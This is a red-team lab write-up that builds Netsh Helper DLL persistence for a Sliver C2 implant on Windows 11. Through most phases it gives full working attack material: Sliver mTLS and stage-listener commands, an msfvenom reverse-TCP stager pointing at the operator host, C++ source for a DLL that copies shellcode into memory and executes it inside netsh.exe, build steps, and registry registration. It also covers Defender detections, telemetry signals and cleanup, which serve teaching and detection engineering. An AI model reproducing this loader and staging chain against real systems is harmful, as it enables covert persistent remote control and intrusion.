---
title: "Sliver C2 Lab: Netsh Helper DLL Persistence & Detection"
summary: "A validated red-team lab combining Sliver staging with a custom Netsh Helper DLL, event-triggered persistence and Microsoft Defender detection analysis."
category: "Red Team Operations"
labType: "red-team-operations"
status: "validated"
difficulty: "Advanced"
duration: "2–3 hours"
environment:
  - "Kali Linux VM"
  - "Windows 11 x64 VM"
  - "Sliver C2 v1.7.3"
  - "Microsoft Defender"
  - "Isolated VMware network"
publishedAt: 2026-09-01T07:00:00Z
updatedAt: 2026-09-01T07:00:00Z
tags:
  - "Sliver C2"
  - "Netsh Helper DLL"
  - "Windows Persistence"
  - "mTLS"
  - "Staging"
  - "C++"
  - "Microsoft Defender"
  - "Detection Engineering"
  - "MITRE ATT&CK"
tools:
  - "Sliver"
  - "Metasploit Framework"
  - "MinGW-w64"
  - "PowerShell"
  - "Microsoft Defender"
  - "Sysmon"
mitre:
  - "T1546.007 — Event Triggered Execution: Netsh Helper DLL"
  - "T1055 — Process Injection (memory-execution telemetry context)"
  - "T1105 — Ingress Tool Transfer"
  - "T1071 — Application Layer Protocol"
sourceName: "Sliver documentation and personal isolated-lab validation"
sourceUrl: "https://sliver.sh/docs/"
visualLeft: "NETSH"
visualRight: ".DLL"
visualProcess: "Sliver C2"
featured: true
draft: false
---

> **Authorized isolated-lab use only.** This experiment was performed on personal VMware virtual machines. Microsoft Defender remained enabled, no antivirus exclusions were created, no protection was disabled and no bypass was attempted. Do not reproduce the technique on a system you do not own or have explicit authorization to test.

<div class="research-state validation-complete">
  <strong>Validation status:</strong> completed in an isolated Windows 11 and Kali Linux lab. The DLL build, Netsh registration, Sliver session, Microsoft Defender response and cleanup procedure were observed directly. Identifiers that add no educational value have been removed.
</div>

## Executive summary

This lab reproduces **Netsh Helper DLL persistence** with Sliver. A custom x64 DLL exports `InitHelperDll`, the function expected by `netsh.exe`. After an administrator registers the DLL as a Netsh helper, Windows stores the path under `HKLM\SOFTWARE\Microsoft\Netsh`. Starting `netsh.exe` loads the DLL, which runs a small TCP stager inside the Netsh process. The stager retrieves a Sliver stage and establishes an mTLS session with the Kali server.

The lab does not exploit a vulnerability. It abuses a legitimate Windows extension mechanism and maps to **MITRE ATT&CK T1546.007 — Netsh Helper DLL**. It also does not demonstrate privilege escalation: registration began from an already elevated PowerShell window, UAC was not bypassed and the resulting session ran in the context of the user who launched Netsh.

The most important result was defensive. Static scanning did not initially stop the custom DLL, but Microsoft Defender later detected suspicious behavior associated with `netsh.exe`, particularly when an interactive shell introduced an anomalous `netsh.exe → cmd.exe` relationship.

## Learning objectives

- Explain how the Netsh helper extension mechanism can provide event-triggered persistence.
- Configure a Sliver mTLS profile and a size-prefixed TCP stage listener.
- Build an x64 Windows DLL with the required `InitHelperDll` export.
- Validate architecture, exports, connectivity and file integrity before registration.
- Distinguish registration, execution, persistence and privilege level.
- Compare static detection with behavioral detection.
- Identify Registry, process, image-load, memory and network telemetry.
- Remove both the Netsh registration and the transferred DLL, then restore the snapshot.

## Execution chain

<div class="attack-flow" role="img" aria-label="Sliver Netsh Helper DLL execution chain">
  <span>HKLM Netsh Registry value references the helper DLL</span>
  <span>Administrator launches netsh.exe</span>
  <span>netsh.exe loads netsh-helper.dll and calls InitHelperDll</span>
  <span>The DLL starts a TCP stager in a separate thread</span>
  <span>The stager retrieves the size-prefixed Sliver stage on TCP 9001</span>
  <span>The stage runs inside netsh.exe and connects to the mTLS listener on TCP 8888</span>
  <span>Defender, Registry, process, image-load, memory and network telemetry are reviewed</span>
</div>

```text
Registry
└── netsh.exe
    └── netsh-helper.dll
        └── TCP stager
            └── Sliver stage in memory
                └── mTLS session to Kali
```

The Registry entry survives a reboot, but execution is triggered when `netsh.exe` starts. This is **event-triggered persistence**, not an automatic boot or logon mechanism.

## MITRE ATT&CK mapping

- [T1546.007 — Event Triggered Execution: Netsh Helper DLL](https://attack.mitre.org/techniques/T1546/007/) is the primary technique.
- [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) applies to transferring the helper DLL and retrieving the stage.
- [T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/) provides context for the mTLS command-and-control transport.

The DLL's private-memory allocation and protection change are valuable telemetry, but this implementation executes its own stager bytes inside the host process; it does not inject into a separate process.

## Lab topology

| System or service | Role | Lab address |
| --- | --- | --- |
| Kali Linux | Sliver server, compiler and file server | `192.168.112.128` |
| Windows 11 x64 | Controlled endpoint | `192.168.112.132` |
| Sliver client/server | Local operator connection | `127.0.0.1:31337` |
| Sliver mTLS listener | Final session | `8888/TCP` |
| TCP stage listener | Stage delivery | `9001/TCP` |
| Python HTTP server | DLL transfer | `8000/TCP` |

Replace the two VM addresses with your own isolated-network addresses. Do not expose the listeners or file server to the public internet.

Files created on Kali:

```text
/home/kali/Documents/Sliver/
├── payload.h
├── netsh_helper.cpp
└── netsh-helper.dll
```

Only one custom file was copied to Windows:

```text
C:\Lab\netsh-helper.dll
```

The Sliver stage was retrieved through TCP 9001 and ran inside `netsh.exe`; a separate `sliver.exe` was not copied to the endpoint.

## Phase 1 — Record addresses and establish the baseline

On Kali:

```bash
ip a
```

On Windows:

```powershell
ipconfig
```

For this execution, the isolated subnet was `192.168.112.0/24`, Kali used `192.168.112.128` and Windows used `192.168.112.132`.

Before continuing:

- [ ] Take clean snapshots of both VMs.
- [ ] Confirm the network is isolated from production systems.
- [ ] Confirm Microsoft Defender real-time and behavior monitoring are enabled.
- [ ] Record the start time and current Defender status.

```powershell
$LabStart = Get-Date

Get-MpComputerStatus |
  Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled
```

## Phase 2 — Validate the Sliver service and client

On Kali, locate the client:

```bash
command -v sliver
ls -lh /usr/local/bin/sliver
locate sliver
```

Run it through `PATH` or by absolute path:

```bash
sliver
```

```bash
/usr/local/bin/sliver
```

Using `./usr/local/bin/sliver` is incorrect because `./` resolves from the current directory rather than the filesystem root.

The initial connection failed with:

```text
Connecting to 127.0.0.1:31337 ...
Connection to server failed context deadline exceeded
```

Service troubleshooting:

```bash
sudo systemctl status sliver --no-pager -l
sudo systemctl restart sliver
sudo systemctl status sliver --no-pager -l
sudo ss -lunp | grep 31337
sudo journalctl -u sliver -n 80 --no-pager
sudo systemctl cat sliver
sudo ls -lh /root/sliver-server
```

Successful client state:

```text
Server v1.7.3
[127.0.0.1] sliver >
```

## Phase 3 — Create the profile and listeners

Inside the Sliver console, create an x64 Windows profile whose final transport is mTLS:

```text
profiles new --mtls 192.168.112.128:8888 --os windows --arch amd64 --format shellcode win-netsh
```

No optional shellcode encoder was selected.

Start the mTLS listener and inspect jobs:

```text
mtls --lport 8888
jobs
```

An accidental second mTLS job was initially created on port 9001 and removed:

```text
jobs -k 2
```

Sliver v1.7.3 returned the following when HTTP staging was attempted:

```text
Unsupported staging protocol: http
```

The lab therefore used a TCP stage listener:

```text
stage-listener --url tcp://192.168.112.128:9001 --profile win-netsh
```

## Phase 4 — Build a compatible size-prefixed TCP stager

The older syntax:

```text
generate stager --lhost 192.168.112.128 --lport 9001 --protocol tcp --arch amd64 --format c --save /home/kali/Documents/Sliver/
```

returned on Sliver v1.7.3:

```text
Error: unknown flag: --lhost
```

A Metasploit custom TCP stager was used as the compatibility path. Because it expects a size-prefixed stage, recreate the Sliver listener with `--prepend-size`:

```text
jobs -k 3
stage-listener --url tcp://192.168.112.128:9001 --profile win-netsh --prepend-size
jobs
```

Expected listener layout:

```text
mTLS listener   tcp/8888
TCP stage       tcp/9001   prepend-size enabled
```

Create `payload.h` from a normal Kali terminal:

```bash
mkdir -p ~/Documents/Sliver

msfvenom \
  --payload windows/x64/custom/reverse_tcp \
  LHOST=192.168.112.128 \
  LPORT=9001 \
  EXITFUNC=thread \
  --format c \
  --out ~/Documents/Sliver/payload.h
```

Observed build information:

```text
Payload size: 511 bytes
Final size of c file: 2179 bytes
Saved as: /home/kali/Documents/Sliver/payload.h
```

Inspect the generated header:

```bash
head -n 8 ~/Documents/Sliver/payload.h
grep -n 'unsigned char' ~/Documents/Sliver/payload.h
wc -c ~/Documents/Sliver/payload.h
```

The header contains an x64 byte array similar to:

```c
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0...";
```

The `.h` file is not compiled by itself. It is included by the C++ DLL source.

## Phase 5 — Build the Netsh Helper DLL

Create `~/Documents/Sliver/netsh_helper.cpp`:

```cpp
#include <windows.h>
#include <cstring>

#include "payload.h"

static DWORD WINAPI RunStager(LPVOID)
{
    const SIZE_T payloadSize = sizeof(buf) - 1;

    void* memory = VirtualAlloc(
        nullptr,
        payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (memory == nullptr)
        return GetLastError();

    std::memcpy(memory, buf, payloadSize);

    DWORD previousProtection = 0;

    if (!VirtualProtect(
            memory,
            payloadSize,
            PAGE_EXECUTE_READ,
            &previousProtection))
    {
        DWORD error = GetLastError();
        VirtualFree(memory, 0, MEM_RELEASE);
        return error;
    }

    FlushInstructionCache(
        GetCurrentProcess(),
        memory,
        payloadSize
    );

    auto entryPoint = reinterpret_cast<void(*)()>(memory);
    entryPoint();

    VirtualFree(memory, 0, MEM_RELEASE);
    return ERROR_SUCCESS;
}

extern "C" __declspec(dllexport)
DWORD WINAPI InitHelperDll(DWORD, PVOID)
{
    HANDLE thread = CreateThread(
        nullptr,
        0,
        RunStager,
        nullptr,
        0,
        nullptr
    );

    if (thread == nullptr)
        return GetLastError();

    CloseHandle(thread);
    return ERROR_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID)
{
    return TRUE;
}
```

### Code walkthrough

1. `payload.h` supplies the stager byte array.
2. `VirtualAlloc` reserves private read/write memory.
3. `memcpy` copies the stager into the allocation.
4. `VirtualProtect` changes the region from read/write to read/execute.
5. `FlushInstructionCache` synchronizes the CPU instruction cache.
6. `entryPoint()` transfers execution to the bytes.
7. `InitHelperDll` is the export expected by `netsh.exe`.
8. `extern "C"` prevents C++ name mangling.
9. `__declspec(dllexport)` places the function in the DLL export table.
10. `CreateThread` prevents the helper initialization path from blocking Netsh.
11. `DllMain` remains a minimal DLL entry point.

This sequence—private allocation, write, execute-protection transition and execution—is also a useful behavioral detection surface.

## Phase 6 — Cross-compile and verify the DLL

Confirm that the MinGW-w64 compiler exists:

```bash
x86_64-w64-mingw32-g++ --version
```

If the compiler is not installed in the disposable Kali VM:

```bash
sudo apt update
sudo apt install mingw-w64
```

Compile the DLL:

```bash
cd ~/Documents/Sliver

x86_64-w64-mingw32-g++ \
  -std=c++17 \
  -O2 \
  -shared \
  -static-libgcc \
  -static-libstdc++ \
  -o netsh-helper.dll \
  netsh_helper.cpp
```

Options used:

- `-std=c++17` selects C++17.
- `-O2` enables compiler optimization.
- `-shared` builds a DLL rather than an executable.
- `-static-libgcc` and `-static-libstdc++` embed the required runtime libraries.
- `-o` sets the output name.

Validate the architecture and required export:

```bash
file netsh-helper.dll
x86_64-w64-mingw32-objdump -p netsh-helper.dll | grep InitHelperDll
ls -lh netsh-helper.dll
```

Observed result:

```text
PE32+ executable for MS Windows (DLL), x86-64
InitHelperDll
Approximate size: 88K
```

Do not transfer the file unless both the x64 architecture and `InitHelperDll` export are present.

## Phase 7 — Validate connectivity

Confirm that Kali is listening:

```bash
sudo ss -lntp | grep -E ':8888|:9001'
```

From Windows:

```powershell
Test-NetConnection 192.168.112.128 -Port 9001
Test-NetConnection 192.168.112.128 -Port 8888
```

Both tests should return:

```text
TcpTestSucceeded : True
```

If either test fails, stop and correct the isolated-network or listener configuration before registering the DLL.

## Phase 8 — Transfer the DLL and verify integrity

On Kali, calculate a fresh hash and start a temporary file server bound only to the lab interface:

```bash
cd ~/Documents/Sliver
sha256sum netsh-helper.dll
python3 -m http.server 8000 --bind 192.168.112.128
```

On Windows:

```powershell
New-Item -ItemType Directory -Path C:\Lab -Force

Invoke-WebRequest `
  -Uri http://192.168.112.128:8000/netsh-helper.dll `
  -OutFile C:\Lab\netsh-helper.dll

Get-FileHash C:\Lab\netsh-helper.dll -Algorithm SHA256
```

The Kali and Windows hashes must match. A previous lab build produced a unique hash, but rebuilding the profile, stager or DLL changes it; always compare the values generated during the current session.

Stop the temporary HTTP server after the transfer.

## Phase 9 — Register the helper and trigger persistence

Running the registration from a non-elevated shell returns:

```text
The requested operation requires elevation (Run as administrator).
```

Open an elevated PowerShell window through the normal UAC prompt:

```powershell
Start-Process powershell -Verb RunAs
```

Confirm Defender remains active, then register the helper:

```powershell
Get-MpComputerStatus |
  Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled

netsh add helper "C:\Lab\netsh-helper.dll"
```

Inspect the Registry location:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Netsh'
```

The helper path is persisted under:

```text
HKLM\SOFTWARE\Microsoft\Netsh
```

Trigger the load:

```powershell
netsh
```

Exit the Netsh prompt with:

```text
exit
```

This step requires Administrator rights because it modifies HKLM. It does not bypass UAC or elevate the Sliver session beyond the context used to launch Netsh.

## Phase 10 — Validate the Sliver session

From the Sliver console:

```text
sessions
use <session-id>
info
whoami
pwd
ls
ps
```

The validated session showed:

```text
Transport: mtls
Remote: 192.168.112.132
OS: windows/amd64
Health: ALIVE
```

The session identifier and codename are intentionally omitted. Commands such as `ls` and `pwd` use native Sliver RPC capabilities and do not necessarily spawn `cmd.exe`.

An optional screenshot can validate session capability inside the personal VM:

```text
screenshot
```

Locate recently created images on Kali:

```bash
find ~/Documents/Sliver ~/.sliver-client \
  -type f -iname '*.png' -mmin -5 \
  -printf '%TY-%Tm-%Td %TT %p\n' 2>/dev/null |
  sort -r |
  head
```

Before publishing any lab screenshot, remove personal data, unrelated files, usernames and other identifiers.

## Microsoft Defender observation

When an interactive shell was requested, the behavior became approximately:

```text
netsh.exe
└── cmd.exe
```

This parent-child relationship is a strong anomaly because `netsh.exe` does not normally create an interactive command shell.

Microsoft Defender reported:

```text
Behavior:Win32/AMSI_Patch_T.B12
Severity: Severe
Affected process: C:\Windows\System32\netsh.exe
Status: Removed
```

The label is a behavioral classification; it does not prove that the custom loader literally patched AMSI. Defender can correlate executable private memory, an unusual Netsh module, network behavior and anomalous child processes.

The custom DLL was not initially stopped by a known static signature. That does **not** make it safe or undetectable. The later behavioral result demonstrates why static and runtime detection are separate defensive layers.

Do not select **Allow**, disable Microsoft Defender, add an exclusion or modify the loader to evade the detection. The alert is a successful result of the lab.

## Detection engineering

### Microsoft Defender detections

```powershell
Get-MpThreatDetection |
  Sort-Object InitialDetectionTime -Descending |
  Select-Object -First 5 ThreatName, InitialDetectionTime, ActionSuccess, Resources |
  Format-List
```

### Defender Operational events

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' |
  Where-Object Id -in 1116,1117 |
  Select-Object -First 10 TimeCreated, Id, Message |
  Format-List
```

### Host artifacts

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Netsh'
Get-Process netsh -ErrorAction SilentlyContinue
Get-NetTCPConnection -RemoteAddress 192.168.112.128 -ErrorAction SilentlyContinue
```

### High-value detection signals

- A new or changed value under `HKLM\SOFTWARE\Microsoft\Netsh`.
- `netsh.exe` process creation following the Registry modification.
- A DLL loaded into `netsh.exe` from a user-writable or unusual path such as `C:\Lab`.
- Private-memory transition from read/write to read/execute.
- `netsh.exe` connections to the stage and mTLS listener ports.
- `netsh.exe → cmd.exe` or another unusual child process.
- Sysmon Event ID `1` — Process Create.
- Sysmon Event ID `3` — Network Connection.
- Sysmon Event ID `7` — Image Load, when enabled by the Sysmon configuration.
- Security Event ID `4657` — Registry Value Modified, when Registry auditing is configured.

### Detection correlation model

| Stage | Evidence | Stronger correlation |
| --- | --- | --- |
| Registration | Netsh Registry value added or changed | Path points outside trusted Windows directories |
| Trigger | `netsh.exe` starts | Shortly follows helper registration |
| Module load | Unusual DLL loaded into Netsh | Unsigned/custom DLL from a writable directory |
| Memory | Private region becomes executable | Network activity follows the transition |
| Stage retrieval | Netsh connects to TCP 9001 | Destination is a workstation or unusual host |
| Final transport | Netsh connects to TCP 8888 | Long-lived encrypted connection |
| Interactive behavior | `netsh.exe → cmd.exe` | Defender/EDR behavioral alert |

No single event proves compromise. The useful detection joins Registry, image-load, process, memory and network events across a short time window.

## Troubleshooting record

### Sliver client cannot reach `127.0.0.1:31337`

- Inspect and restart the systemd service.
- Confirm the listener with `ss`.
- Review `journalctl` output and the service definition.
- Verify the server binary referenced by the unit exists.

### HTTP staging is unsupported

Sliver v1.7.3 returned `Unsupported staging protocol: http`. Use the tested TCP listener rather than repeatedly changing unrelated components.

### Generated stager flags are rejected

The installed version did not accept the older `--lhost` syntax. The validated workaround used a compatible custom TCP stager and enabled `--prepend-size` on the Sliver stage listener.

### No session appears

- Confirm TCP 9001 and 8888 are reachable from Windows.
- Confirm the stage listener uses `--prepend-size`.
- Confirm the profile points to the correct Kali mTLS address.
- Confirm the DLL is x64 and exports `InitHelperDll`.
- Check whether Microsoft Defender blocked or removed the behavior.
- Do not disable security controls to force a session.

### Netsh registration requires elevation

This is expected. Use the normal UAC prompt in the disposable lab. The technique is not a UAC bypass.

## Cleanup and restoration

Remove the helper registration from an elevated Windows PowerShell window:

```powershell
netsh delete helper C:\Lab\netsh-helper.dll
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Netsh'
```

Confirm that the custom helper path is absent before deleting the file:

```powershell
Remove-Item -LiteralPath 'C:\Lab\netsh-helper.dll' -Force -ErrorAction SilentlyContinue
```

In Sliver:

```text
background
sessions
sessions -k <session-id>
jobs
```

Stop the stage and mTLS jobs created for the lab, then stop the temporary HTTP server.

Deleting only the DLL is insufficient if the Registry value remains. The safest final cleanup is to restore both VMs from their clean snapshots and confirm that no listener or session remains.

## Completion checklist

- [ ] Sliver service is active and the client connects to `127.0.0.1:31337`.
- [ ] The mTLS listener is active on TCP 8888.
- [ ] The TCP stage listener is active on TCP 9001 with `--prepend-size`.
- [ ] The profile targets Windows amd64 and the lab mTLS address.
- [ ] `payload.h` contains `unsigned char buf[]`.
- [ ] The DLL is a PE32+ x64 Windows DLL.
- [ ] The `InitHelperDll` export is present.
- [ ] Connectivity to TCP 8888 and 9001 succeeds.
- [ ] Kali and Windows DLL hashes match.
- [ ] Registration is performed only from elevated PowerShell.
- [ ] Microsoft Defender remains enabled.
- [ ] The mTLS session is validated without publishing sensitive identifiers.
- [ ] Defender and host telemetry are preserved.
- [ ] The helper registration and DLL are removed.
- [ ] Sliver sessions/listeners are stopped and snapshots are restored.

## Key findings

- Netsh Helper DLL is a legitimate extensibility mechanism that can be abused for event-triggered persistence.
- The Registry value persists across reboot, but execution still requires the Netsh trigger.
- The custom DLL was the only lab-built file copied to Windows; the Sliver stage executed inside `netsh.exe`.
- Static and behavioral detection represent different layers of defense.
- Native Sliver RPC functionality and an interactive shell produced different detection profiles.
- A strong defender correlates Registry, process, module-load, memory and network telemetry.
- The exercise did not exploit a CVE, bypass UAC, escalate privileges or bypass Microsoft Defender.

## References

- [Sliver documentation](https://sliver.sh/docs/)
- [Sliver stagers](https://sliver.sh/docs/?name=Stagers)
- [Bishop Fox — Sliver on GitHub](https://github.com/BishopFox/sliver)
- [Sliver v1.7.3 issue #2267](https://github.com/BishopFox/sliver/issues/2267)
- [MITRE ATT&CK — Netsh Helper DLL, T1546.007](https://attack.mitre.org/techniques/T1546/007/)
- [Microsoft Learn — netsh add helper](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-add)
- [Microsoft Learn — netsh delete helper](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-delete)
